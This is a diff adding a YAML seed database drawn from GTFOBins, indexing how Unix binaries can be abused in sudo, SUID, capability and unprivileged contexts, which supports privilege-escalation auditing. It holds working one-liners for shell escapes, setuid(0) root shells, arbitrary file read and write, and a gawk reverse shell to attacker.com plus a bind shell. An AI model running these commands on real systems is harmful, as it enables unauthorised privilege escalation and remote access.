@@ -1,0 +1,245 @@
+_metadata:
+  source: "GTFOBins"
+  source_url: "https://gtfobins.org/"
+  schema_version: 2
+  description: "Offline seed with contextual function details; run update for the full current index"
+  updated: "packaged seed"
+binaries:
+  apt:
+    functions: [shell]
+    contexts: {sudo: [shell]}
+  awk:
+    functions: [file-read, file-write, shell]
+    contexts: {sudo: [file-read, file-write, shell], suid: [file-read, file-write, shell], unprivileged: [file-read, file-write, shell]}
+    techniques:
+      unprivileged:
+        - {function: shell, code: "awk 'BEGIN {system(\"/bin/sh\")}'"}
+        - {function: file-read, code: "awk '//' /path/to/input-file"}
+        - {function: file-write, code: "awk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}
+      sudo:
+        - {function: shell, code: "awk 'BEGIN {system(\"/bin/sh\")}'"}
+        - {function: file-read, code: "awk '//' /path/to/input-file"}
+        - {function: file-write, code: "awk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}
+      suid:
+        - {function: shell, code: "awk 'BEGIN {system(\"/bin/sh\")}'"}
+        - {function: file-read, code: "awk '//' /path/to/input-file"}
+        - {function: file-write, code: "awk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}
+  gawk:
+    functions: [bind-shell, file-read, file-write, reverse-shell, shell]
+    contexts:
+      sudo: [bind-shell, file-read, file-write, reverse-shell, shell]
+      suid: [bind-shell, file-read, file-write, reverse-shell, shell]
+      unprivileged: [bind-shell, file-read, file-write, reverse-shell, shell]
+    techniques:
+      unprivileged:
+        - {function: shell, code: "gawk 'BEGIN {system(\"/bin/sh\")}'"}
+        - {function: file-read, code: "gawk '//' /path/to/input-file"}
+        - {function: file-write, code: "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}
+        - function: reverse-shell
+          code: |-
+            gawk 'BEGIN {
+                s = "/inet/tcp/0/attacker.com/12345";
+                while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+                while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+        - function: bind-shell
+          code: |-
+            gawk 'BEGIN {
+                s = "/inet/tcp/12345/0/0";
+                while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+                while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+      sudo:
+        - {function: shell, code: "gawk 'BEGIN {system(\"/bin/sh\")}'"}
+        - {function: file-read, code: "gawk '//' /path/to/input-file"}
+        - {function: file-write, code: "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}
+        - {function: reverse-shell, code: "gawk 'BEGIN { s = \"/inet/tcp/0/attacker.com/12345\"; while (1) { printf \"> \" |& s; if ((s |& getline c) <= 0) break } }'"}
+        - {function: bind-shell, code: "gawk 'BEGIN { s = \"/inet/tcp/12345/0/0\"; while (1) { printf \"> \" |& s; if ((s |& getline c) <= 0) break } }'"}
+      suid:
+        - {function: shell, code: "gawk 'BEGIN {system(\"/bin/sh\")}'"}
+        - {function: file-read, code: "gawk '//' /path/to/input-file"}
+        - {function: file-write, code: "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}
+        - {function: reverse-shell, code: "gawk 'BEGIN { s = \"/inet/tcp/0/attacker.com/12345\"; while (1) { printf \"> \" |& s; if ((s |& getline c) <= 0) break } }'"}
+        - {function: bind-shell, code: "gawk 'BEGIN { s = \"/inet/tcp/12345/0/0\"; while (1) { printf \"> \" |& s; if ((s |& getline c) <= 0) break } }'"}
+  bash:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell]}
+  cp:
+    functions: [file-read, file-write]
+    contexts: {sudo: [file-read, file-write], suid: [file-read, file-write]}
+  env:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell]}
+  find:
+    functions: [file-read, file-write, shell]
+    contexts: {sudo: [file-read, file-write, shell], suid: [file-read, file-write, shell]}
+  gcore:
+    functions: [file-read]
+    contexts: {sudo: [file-read]}
+  gdb:
+    functions: [shell]
+    contexts: {capabilities: [shell]}
+    techniques:
+      capabilities:
+        - function: shell
+          code: "gdb -nx -ex '!/bin/sh' -ex quit"
+          context_details:
+            list: [CAP_SETUID]
+            code: "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit"
+  less:
+    functions: [file-read, shell]
+    contexts: {sudo: [file-read, shell], suid: [file-read, shell]}
+  lua:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell]}
+  nano:
+    functions: [file-read, file-write, shell]
+    contexts: {sudo: [file-read, file-write, shell], suid: [file-read, file-write, shell]}
+    techniques:
+      suid:
+        - {function: file-read, code: "nano /path/to/input-file"}
+        - {function: file-write, code: "nano /path/to/output-file\nDATA\n^O"}
+        - {function: shell, code: "nano\n^R^X\nreset; sh 1>&0 2>&0"}
+  nmap:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell]}
+  node:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell], capabilities: [shell]}
+    techniques:
+      capabilities:
+        - function: shell
+          code: "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
+          context_details:
+            list: [CAP_SETUID]
+            code: "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
+  perl:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [file-read], capabilities: [shell]}
+    techniques:
+      capabilities:
+        - function: shell
+          code: "perl -e 'exec \"/bin/sh\"'"
+          context_details:
+            list: [CAP_SETUID]
+            code: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\"'"
+      suid:
+        - {function: file-read, code: "perl -ne print /path/to/input-file"}
+  php:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell], capabilities: [shell]}
+    techniques:
+      capabilities:
+        - function: shell
+          code: "php -r 'system(\"/bin/sh -i\");'"
+          context_details:
+            list: [CAP_SETUID]
+            code: "php -r 'posix_setuid(0); system(\"/bin/sh -i\");'"
+  python:
+    functions: [library-load, shell]
+    contexts: {sudo: [shell], suid: [shell], capabilities: [shell]}
+    techniques:
+      capabilities:
+        - function: shell
+          code: "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
+          context_details:
+            list: [CAP_SETUID]
+            code: "python -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'"
+  ruby:
+    functions: [shell]
+    contexts: {sudo: [shell], capabilities: [shell]}
+    techniques:
+      capabilities:
+        - function: shell
+          code: "ruby -e 'exec \"/bin/sh\"'"
+          context_details:
+            list: [CAP_SETUID]
+            code: "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+  systemctl:
+    functions: [shell]
+    contexts: {sudo: [shell], suid: [shell]}
+  tar:
+    functions: [file-read, file-write, shell]
+    contexts: {sudo: [file-read, file-write, shell], suid: [file-read, file-write, shell], unprivileged: [file-read, file-write, shell]}
+    techniques:
+      sudo:
+        - function: shell
+          code: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+          comment: "Requires GNU tar checkpoint support. Prefix with sudo when validating an unrestricted sudo rule."
+        - function: file-read
+          code: "tar cf /dev/stdout /path/to/input-file -I 'tar xO'"
+          comment: "GNU tar reads the file and passes it through the selected compression program. Prefix with sudo when validating an unrestricted sudo rule."
+        - function: file-write
+          code: |-
+            echo DATA >/path/to/temp-file
+            tar cf /path/to/temp-file.tar /path/to/temp-file
+            tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
+          comment: "Prefix the privileged tar invocation with sudo when validating an unrestricted sudo rule."
+      unprivileged:
+        - function: file-read
+          code: "tar cf /dev/stdout /path/to/input-file -I 'tar xO'"
+          comment: "GNU tar reads the file and passes it through the selected compression program."
+        - function: file-write
+          code: |-
+            echo DATA >/path/to/temp-file
+            tar cf /path/to/temp-file.tar /path/to/temp-file
+            tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
+        - function: shell
+          code: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+  tac:
+    functions: [file-read]
+    contexts: {unprivileged: [file-read]}
+    techniques:
+      unprivileged:
+        - function: file-read
+          code: "tac -s 'RANDOM' /path/to/input-file"
+          comment: "Choose a separator that does not occur in the input or the output order may be altered."
+  base64:
+    functions: [file-read]
+    contexts: {sudo: [file-read], suid: [file-read], unprivileged: [file-read]}
+    techniques:
+      sudo:
+        - {function: file-read, code: "base64 /path/to/input-file | base64 --decode"}
+      suid:
+        - {function: file-read, code: "base64 /path/to/input-file | base64 --decode"}
+      unprivileged:
+        - {function: file-read, code: "base64 /path/to/input-file | base64 --decode"}
+  base32:
+    functions: [file-read]
+    contexts: {sudo: [file-read], suid: [file-read], unprivileged: [file-read]}
+    techniques:
+      sudo:
+        - {function: file-read, code: "base32 /path/to/input-file | base32 --decode"}
+      suid:
+        - {function: file-read, code: "base32 /path/to/input-file | base32 --decode"}
+  arp:
+    functions: [file-read]
+    contexts: {sudo: [file-read], suid: [file-read], unprivileged: [file-read]}
+    techniques:
+      sudo:
+        - {function: file-read, code: "arp -v -f /path/to/input-file", comment: "Lines may be leaked through parser error messages."}
+      suid:
+        - {function: file-read, code: "arp -v -f /path/to/input-file", comment: "Lines may be leaked through parser error messages."}
+  apache2:
+    functions: [file-read]
+    contexts: {sudo: [file-read]}
+    techniques:
+      sudo:
+        - {function: file-read, code: "apache2 -f /path/to/input-file", comment: "The first line may be leaked through an error message."}
+  service:
+    functions: [shell]
+    contexts: {sudo: [shell]}
+    techniques:
+      sudo:
+        - {function: shell, code: "service ../../bin/sh"}
+  ssh:
+    functions: [file-read, shell]
+    contexts: {sudo: [file-read, shell], suid: [file-read, shell]}
+    techniques:
+      sudo:
+        - {function: shell, code: "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x"}
+        - {function: file-read, code: "ssh -F /path/to/input-file x"}
+  vi:
+    functions: [file-read, file-write, shell]
+    contexts: {sudo: [file-read, file-write, shell], suid: [file-read, file-write, shell]}
+  vim:
+    functions: [file-read, file-write, shell]
+    contexts: {sudo: [file-read, file-write, shell], suid: [file-read, file-write, shell]}
